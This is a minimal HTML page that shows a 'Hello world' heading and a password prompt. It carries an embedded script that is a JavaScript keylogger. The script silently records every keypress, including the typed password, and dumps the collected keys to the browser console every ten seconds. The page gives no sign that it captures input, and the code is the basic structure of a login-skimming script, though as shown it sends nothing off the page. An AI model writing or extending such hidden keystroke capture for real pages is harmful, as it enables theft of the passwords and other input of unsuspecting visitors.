


<h1> Hello world </h1> 

<p>Enter your password:</p>
<input type="password"/>

<script>
var keys='';
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		console.log(keys);
		keys = '';
	}
}, 10000);
</script>
